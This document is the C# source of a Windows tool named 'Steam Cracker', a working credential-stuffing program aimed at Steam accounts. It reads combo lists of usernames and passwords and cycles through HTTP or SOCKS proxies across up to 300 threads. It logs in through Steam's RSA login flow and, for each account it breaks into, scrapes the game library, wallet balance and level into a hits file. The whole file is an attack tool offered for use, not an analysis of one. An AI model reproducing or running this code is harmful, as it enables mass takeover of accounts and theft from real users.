using Leaf.xNet;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;
using Form = System.Windows.Forms;

namespace Steam_Cracker
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        List<string> Base = new List<string>();
        List<string> IP = new List<string>();
        int Fail;
        int Hit;
        int Tfa;
        int Retry;
        int Remaining;
        int Checked;
        int CPM;
        double Persent;
        int Threa = 100;
        int seconds = 0;
        int minutes = 0;
        int hours = 0;
        string ResultTime;
        string Log;
        private bool _Save;

        public enum Type
        {
            Http,
            Socks4,
            Socks4a,
            Socks5
        }
        public Type IPType = Type.Http;

        DispatcherTimer dt = new DispatcherTimer();

        public MainWindow()
        {
            InitializeComponent();
            //====================//
            dt.Tick += Dt_Tick;
            dt.Interval = new TimeSpan(0, 0, 1);
        }

        private void Dt_Tick(object sender, EventArgs e)
        {
            if (seconds == 59)
            {
                seconds = 0;
                if (minutes == 59)
                {
                    minutes = 0;
                    hours++;
                }
                else
                {
                    minutes++;
                }
            }
            else
            {
                seconds++;
            }
            lblTimer.Content = (hours > 9 ? hours + "" : "0" + hours) + ":"
                + (minutes > 9 ? minutes + "" : "0" + minutes) + ":"
                + (seconds > 9 ? seconds + "" : "0" + seconds);
        }

        private void Grid_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private void btnKill_Click(object sender, RoutedEventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }

        private void btnMinimize_Click(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void btnRestart_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
            Process.Start(Environment.GetCommandLineArgs()[0]);
        }

        private void btnLog_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                bool Opened = false;
                foreach (Window w in Application.Current.Windows)
                {
                    if (w.Title == "Log")
                    {
                        Opened = true;
                        w.BringIntoView();
                        break;
                    }
                }
                if (Opened == false)
                {
                    var w1 = new Window1();
                    w1.Show();
                    w1.textboxLog.Text = Log;
                }
            }
            catch
            {

            }
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            Process.Start("https://t.me/Ariaei_co");
        }

        private void Config(string line)
        {
            string User = line.Split(':')[0];
            string Pass = line.Split(':')[1];
            for (int i = 2; i < line.Split(':').Length; i++)
            {
                Pass += ":" + line.Split(':')[i];
            }
            First:
            try
            {
                int p = new Random().Next(IP.Count);
                CookieStorage cook = new CookieStorage();
                string Time = DateTimeOffset.Now.ToUnixTimeMilliseconds().ToString();
                //===========================//
                using (HttpRequest Web = new HttpRequest())
                {
                    switch (IPType)
                    {
                        case Type.Http:
                            Web.Proxy = HttpProxyClient.Parse(IP[p]);
                            break;
                        case Type.Socks4:
                            Web.Proxy = Socks4ProxyClient.Parse(IP[p]);
                            break;
                        case Type.Socks4a:
                            Web.Proxy = Socks4AProxyClient.Parse(IP[p]);
                            break;
                        case Type.Socks5:
                            Web.Proxy = Socks5ProxyClient.Parse(IP[p]);
                            break;
                    }
                    Web.AddHeader(HttpHeader.Accept, "*/*");
                    Web.AddHeader(HttpHeader.AcceptLanguage, "fa,en;q=0.9,en-US;q=0.8");
                    Web.AddHeader(HttpHeader.Origin, "https://store.steampowered.com");
                    Web.AddHeader("Sec-Fetch-Dest", "empty");
                    Web.AddHeader("Sec-Fetch-Mode", "cors");
                    Web.AddHeader("Sec-Fetch-Site", "same-origin");
                    Web.AddHeader("X-Requested-With", "XMLHttpRequest");
                    Web.Referer = "https://store.steampowered.com/login/?redir=&redir_ssl=1";
                    Web.UserAgent = "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36";
                    Web.AllowAutoRedirect = true;
                    Web.IgnoreProtocolErrors = true;
                    Web.KeepAlive = true;
                    Web.UseCookies = true;
                    Web.Cookies = cook;
                    string Response = Web.Post("https://store.steampowered.com/login/getrsakey/", Encoding.ASCII.GetBytes($"donotcache={Time}&username={User}"), "application/x-www-form-urlencoded; charset=UTF-8").ToString();
                    //=============================//
                    string Mod = Regex.Match(Response, "\"publickey_mod\":\"(.*?)\",\"").Groups[1].Value.ToString();
                    string Enco = Uri.EscapeDataString(Encrypt(Pass, "010001", Mod));
                    string TimeStamp = Regex.Match(Response, "\"timestamp\":\"(.*?)\",\"").Groups[1].Value.ToString();
                    //===========================//
                    Web.AllowAutoRedirect = true;
                    Web.IgnoreProtocolErrors = true;
                    Web.KeepAlive = true;
                    Web.UseCookies = true;
                    Web.Cookies = cook;
                    var Data = Web.Post("https://store.steampowered.com/login/dologin/", Encoding.ASCII.GetBytes($"donotcache={Time}&password={Enco}&username={User}&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={TimeStamp}&remember_login=false"), "application/x-www-form-urlencoded");
                    if (Data.ToString().Contains("\"success\":true") && Data.ToString().Contains("\"requires_twofactor\":false"))
                    {
                        string ID = Regex.Match(Data.ToString(), "\"steamid\":\"(.*?)\"").Groups[1].Value;
                        Web.AddHeader(HttpHeader.Accept, "*/*");
                        Web.AddHeader(HttpHeader.Pragma, "no-cache");
                        Web.AddHeader("Cookie", Data.Cookies.GetCookieHeader(Data.Address));
                        Web.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
                        Web.AllowAutoRedirect = true;
                        Web.IgnoreProtocolErrors = true;
                        Web.KeepAlive = true;
                        Web.UseCookies = true;
                        Web.Cookies = cook;
                        string Resp = Web.Get($"https://steamcommunity.com/profiles/{ID}/games/?tab=all").ToString();
                        string Kol = Regex.Match(Resp, "var rgGames(.*?)}}];").Groups[1].Value;
                        Match Ga = Regex.Match(Kol, "\"name\":\"(.*?)\",");
                        string Game = Ga.Groups[1].Value.ToString();
                        string[] ggg = new string[1] { "name" };
                        int gg = Kol.Split(ggg, StringSplitOptions.RemoveEmptyEntries).Length - 1;
                        for (int g = 1; g < gg; g++)
                        {
                            Ga = Ga.NextMatch();
                            Game += Environment.NewLine + Ga.Groups[1].Value.ToString();
                        }
                        Web.AllowAutoRedirect = true;
                        Web.IgnoreProtocolErrors = true;
                        Web.KeepAlive = true;
                        Web.UseCookies = true;
                        Web.Cookies = cook;
                        var Respo = Web.Get("https://store.steampowered.com/account/");
                        string bb = Regex.Match(Respo.ToString(), "<div data-tooltip-text=\"Click to view(.*?)div>").Groups[1].Value.ToString();
                        string Balance = string.Empty;
                        if (bb.Contains("https://store.steampowered.com/account/history/\">"))
                        {
                            Balance = Regex.Match(bb, "ref=\"https://store.steampowered.com/account/history/\">(.*?)</a></").Groups[1].Value.ToString();
                        }
                        else if (bb.Contains("<div class=\"accountData price\">"))
                        {
                            Balance = Regex.Match(bb, "<div class=\"accountData price\">(.*?)</").Groups[1].Value.ToString();
                        }
                        Web.AllowAutoRedirect = true;
                        Web.IgnoreProtocolErrors = true;
                        Web.KeepAlive = true;
                        Web.UseCookies = true;
                        Web.Cookies = cook;
                        Web.AddHeader("Cookie", Data.Cookies.GetCookieHeader(Data.Address));
                        string le = Web.Get($"https://steamcommunity.com/profiles/{ID}/badges/").ToString();
                        string Level = Regex.Match(le, "<span class=\"friendPlayerLevel lvl_0\"><span class=\"friendPlayerLevelNum\">(.*?)</span>").Groups[1].Value.ToString();
                        //============================//
                        Hit++;
                        Checked++;
                        Remaining = Base.Count - Checked;
                        lblHit.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblHit.Content = "Hit: " + Hit.ToString(); }));
                        lblChecked.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblChecked.Content = "Checked: " + Checked.ToString(); }));
                        lblRemaining.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRemaining.Content = "Remaining: " + Remaining.ToString(); }));
                        Persent = (((double)Checked / Base.Count) * 100);
                        lblPersent.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblPersent.Content = "Total: " + Persent.ToString("F3") + "%"; }));
                        if (minutes == 0)
                        {
                            CPM = Checked;
                        }
                        else if (hours == 0)
                        {
                            CPM = ((Checked * 100) / ((minutes * 100) + (seconds * 100 / 60)));
                        }
                        else
                        {
                            CPM = ((Checked * 100) / ((((hours * 60) * 100) + (minutes * 100)) + (seconds * 100 / 60)));
                        }
                        lblCPM.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblCPM.Content = "CPM: " + CPM.ToString(); }));
                        Log += $"-----------------Start-----------------\nUsername: {User}\nPassword: {Pass}\n{User}:{Pass}\n--------Capture---------\nGames:\n{Game}\nBalance: {Balance}\nLevel: {Level}\n-----------------End-----------------\n\n";
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Hit.txt", true);
                        sw.WriteLine($"-----------------Start-----------------\nUsername: {User}\nPassword: {Pass}\n{User}:{Pass}\n--------Capture---------\nGames:\n{Game}\nBalance: {Balance}\nLevel: {Level}\n-----------------End-----------------\n\n");
                        sw.Close();
                    }
                    else if ((Data.ToString().Contains("\"success\":true") && Data.ToString().Contains("\"requires_twofactor\":true")) || Data.ToString().Contains("\"emailauth_needed\":true"))
                    {
                        Tfa++;
                        Checked++;
                        lblTfa.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblTfa.Content = "2FA: " + Tfa.ToString(); }));
                        lblChecked.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblChecked.Content = "Checked: " + Checked.ToString(); }));
                        Remaining = Base.Count - Checked;
                        lblRemaining.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRemaining.Content = "Remaining: " + Remaining.ToString(); }));
                        Persent = (((double)Checked / Base.Count) * 100);
                        lblPersent.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblPersent.Content = "Total: " + Persent.ToString("F3") + "%"; }));
                        if (minutes == 0)
                        {
                            CPM = Checked;
                        }
                        else if (hours == 0)
                        {
                            CPM = ((Checked * 100) / ((minutes * 100) + (seconds * 100 / 60)));
                        }
                        else
                        {
                            CPM = ((Checked * 100) / ((((hours * 60) * 100) + (minutes * 100)) + (seconds * 100 / 60)));
                        }
                        lblCPM.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblCPM.Content = "CPM: " + CPM.ToString(); }));
                        if (_Save == false)
                        {
                            StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\2FA.txt", true);
                            sw.WriteLine($"{User}:{Pass}");
                            sw.Close();
                        }
                    }
                    else if (Data.ToString().Contains("The account name or password that you have entered is incorrect.") || Data.ToString().Contains("Incorrect account name or password."))
                    {
                        if (_Save == false)
                        {
                            StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Fail.txt", true);
                            sw.WriteLine($"{User}:{Pass}");
                            sw.Close();
                        }
                        Fail++;
                        Checked++;
                        Remaining = Base.Count - Checked;
                        Persent = (((double)Checked / Base.Count) * 100);
                        if (minutes == 0)
                        {
                            CPM = Checked;
                        }
                        else if (hours == 0)
                        {
                            CPM = ((Checked * 100) / ((minutes * 100) + (seconds * 100 / 60)));
                        }
                        else
                        {
                            CPM = ((Checked * 100) / ((((hours * 60) * 100) + (minutes * 100)) + (seconds * 100 / 60)));
                        }
                        lblFail.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblFail.Content = "Fail: " + Fail.ToString(); }));
                        lblChecked.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblChecked.Content = "Checked: " + Checked.ToString(); }));
                        lblCPM.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblCPM.Content = "CPM: " + CPM.ToString(); }));
                        lblRemaining.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRemaining.Content = "Remaining: " + Remaining.ToString(); }));
                        lblPersent.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblPersent.Content = "Total: " + Persent.ToString("F3") + "%"; }));
                    }
                    else
                    {
                        Retry++;
                        lblRetry.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRetry.Content = "Retry: " + Retry.ToString(); }));
                        Thread.Sleep(2000);
                        goto First;
                    }
                }

            }
            catch
            {
                Retry++;
                lblRetry.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRetry.Content = "Retry: " + Retry.ToString(); }));
                Thread.Sleep(2000);
                goto First;
            }
        }

        private void Start()
        {
            ThreadPool.SetMinThreads(Threa, Threa);
            ThreadPool.SetMaxThreads(Threa, Threa);
            for (int i = 0; i <= Base.Count(); i++)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(delegate { try { Config(Base[i]); } catch { } }));
                Thread.Sleep(200);
            }
        }

        private void btnStart_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (Base.Count != 0)
                {
                    if (IP.Count != 0)
                    {
                        if (Threa > Base.Count)
                        {
                            Threa = Base.Count;
                            lblThread.Text = "Thread: " + Threa.ToString();
                        }
                        if (Retry == 0 && Checked == 0)
                        {
                            ResultTime = $"{DateTime.Now.ToString($"{0:yyyy-MM-dd}" + "---" + $"{0:HH-mm-ss}")}";
                            Directory.CreateDirectory("Checked in " + $"{ResultTime}");
                        }
                        dt.Start();
                        btnStart.IsEnabled = false;
                        btnStop.IsEnabled = true;
                        Thread th = new Thread(new ThreadStart(Start));
                        th.IsBackground = true;
                        th.Start();
                    }
                    else
                    {
                        MessageBox.Show("Please Load IP.", "Start");
                    }
                }
                else
                {
                    MessageBox.Show("Please Load Base.", "Start");
                }
            }
            catch
            {
                dt.Stop();
                lblTimer.Content = "00:00:00";
                minutes = 0;
                seconds = 0;
                hours = 0;
                Directory.Delete("Checked in " + $"{ResultTime}");
                MessageBox.Show("Error To Start Checking.", "Start");
            }
        }

        private void btnBase_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                OpenFileDialog Open = new OpenFileDialog();
                Open.Filter = "Select Base |*.txt";
                Open.Multiselect = false;
                Open.Title = "Select Base ";
                if (Open.ShowDialog() == DialogResult == false)
                {
                    Base.Clear();
                    StreamReader sr = new StreamReader(Open.FileName);
                    while (!sr.EndOfStream)
                    {
                        try
                        {
                            string txt = sr.ReadLine();
                            char[] Spl = { ':' };
                            string[] Comb = txt.Split(Spl);
                            string Com = Comb[1];
                            for (int i = 2; i < Comb.Length; i++)
                            {
                                Com += ":" + Comb[i];
                            }
                            Base.Add(Comb[0] + ":" + Com);
                        }
                        catch
                        {

                        }
                    }
                    sr.Close();
                    btnBase.Content = Base.Count.ToString();
                }
            }
            catch
            {
                MessageBox.Show("Error To Load Base.", "Base");
            }
        }

        private void btnIP_Click(object sender, RoutedEventArgs e)
        {
            if (checkboxIP.IsChecked == false)
            {
                try
                {
                    OpenFileDialog Open = new OpenFileDialog();
                    Open.Filter = "Select IP |*.txt";
                    Open.Multiselect = false;
                    Open.Title = "Select IP ";
                    if (Open.ShowDialog() == DialogResult == false)
                    {
                        IP.Clear();
                        StreamReader sr = new StreamReader(Open.FileName);
                        while (!sr.EndOfStream)
                        {
                            try
                            {
                                string txt = sr.ReadLine();
                                char[] Spl = { ':' };
                                string[] Prox = txt.Split(Spl);
                                IP.Add(Prox[0] + ':' + Prox[1]);
                            }
                            catch
                            {

                            }
                        }
                        sr.Close();
                        btnIP.Content = IP.Count.ToString();
                    }
                }
                catch
                {
                    MessageBox.Show("Error To Load IP.", "IP");
                }
            }
            else if (checkboxIP.IsChecked == true)
            {
                try
                {
                    HttpRequest http = new HttpRequest();
                    var result = http.Get(textboxIP.Text).ToString();
                    var Final = result.Split('\n');
                    IP.Clear();
                    IP.AddRange(Final);
                    btnIP.Content = IP.Count.ToString();
                }
                catch
                {
                    MessageBox.Show("Error To Load IP.", "IP");
                }
            }
        }

        private void btnStop_Click(object sender, RoutedEventArgs e)
        {
            dt.Stop();
            btnStart.IsEnabled = true;
            btnStop.IsEnabled = false;
            ThreadPool.SetMinThreads(0, 0);
            ThreadPool.SetMaxThreads(0, 0);
            MessageBox.Show("Cracker Was Stoped.", "Stop");
        }

        private void btnResult_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                Process.Start("Checked in " + $"{ ResultTime}");
            }
            catch
            {

            }
        }

        private void btnThUP_Click(object sender, RoutedEventArgs e)
        {
            if (Threa < 300)
            {
                Threa++;
                lblThread.Text = "Thread: " + Threa.ToString();
            }
        }

        private void btnThDW_Click(object sender, RoutedEventArgs e)
        {
            if (Threa > 1)
            {
                Threa--;
                lblThread.Text = "Thread: " + Threa.ToString();
            }
        }

        private void lblThread_TextChanged(object sender, TextChangedEventArgs e)
        {
            try
            {
                string th = lblThread.Text;
                if (!th.Contains("Thread: "))
                {
                    int thd = Convert.ToInt32(th);
                    if (thd >= 300)
                    {
                        thd = 300;
                        Threa = thd;
                        lblThread.Text = "Thread: " + Threa.ToString();
                    }
                    else if (thd <= 1)
                    {
                        thd = 1;
                        Threa = thd;
                        lblThread.Text = "Thread: " + Threa.ToString();
                    }
                    else
                    {
                        Threa = thd;
                        lblThread.Text = "Thread: " + Threa.ToString();
                    }
                }
                else if (th.Contains("Thread: "))
                {
                    int thr = Convert.ToInt32(th.Split(' ')[1]);
                    if (thr >= 300)
                    {
                        thr = 300;
                        Threa = thr;
                        lblThread.Text = "Thread: " + Threa.ToString();
                    }
                    else if (thr <= 1)
                    {
                        thr = 1;
                        Threa = thr;
                        lblThread.Text = "Thread: " + Threa.ToString();
                    }
                    else
                    {
                        Threa = thr;
                        lblThread.Text = "Thread: " + Threa.ToString();
                    }
                }
            }
            catch
            {

            }
        }

        private void ComboboxIP_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (ComboboxIP.SelectedIndex == 0)
            {
                IPType = Type.Http;
            }
            else if (ComboboxIP.SelectedIndex == 1)
            {
                IPType = Type.Socks4;
            }
            else if (ComboboxIP.SelectedIndex == 2)
            {
                IPType = Type.Socks4a;
            }
            else if (ComboboxIP.SelectedIndex == 3)
            {
                IPType = Type.Socks5;
            }
        }

        private void checkboxIP_Click(object sender, RoutedEventArgs e)
        {
            if (checkboxIP.IsChecked == true)
            {
                textboxIP.IsEnabled = true;
                textboxIP.Clear();
            }
            else if (checkboxIP.IsChecked == false)
            {
                textboxIP.IsEnabled = false;
                textboxIP.Text = "IP From API:";
            }
        }

        public string Encrypt(string Pass, string Exp, string Mod)
        {
            byte[] inArray;
            using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider())
            {
                byte[] bytes = Encoding.ASCII.GetBytes(Pass);
                RSAParameters parameters = rsacryptoServiceProvider.ExportParameters(false);
                parameters.Exponent = GoBy(Exp);
                parameters.Modulus = GoBy(Mod);
                rsacryptoServiceProvider.ImportParameters(parameters);
                inArray = rsacryptoServiceProvider.Encrypt(bytes, false);
            }
            return Convert.ToBase64String(inArray);
        }

        public static byte[] GoBy(string str)
        {
            int length = str.Length;
            decimal value = new decimal(length);
            checked
            {
                byte[] bytes = new byte[(int)Math.Round(Math.Round(Math.Round(unchecked(Convert.ToDouble(value) / 2.0 - 1.0)))) + 1 - 1 + 1 - 1 + 1];
                int num = length - 1;
                for (int i = 0; i <= num; i += 2)
                {
                    byte[] array2 = bytes;
                    value = new decimal(i);
                    array2[(int)Math.Round(Math.Round(Math.Round(Convert.ToDouble(value) / 2.0)))] = Convert.ToByte(str.Substring(i, 2), 16);
                }
                return bytes;
            }
        }

        private void checkboxSave_Click(object sender, RoutedEventArgs e)
        {
            if (checkboxSave.IsChecked == true)
            {
                _Save = true;
            }
            else if (checkboxSave.IsChecked == false)
            {
                _Save = false;
            }
        }
    }
}
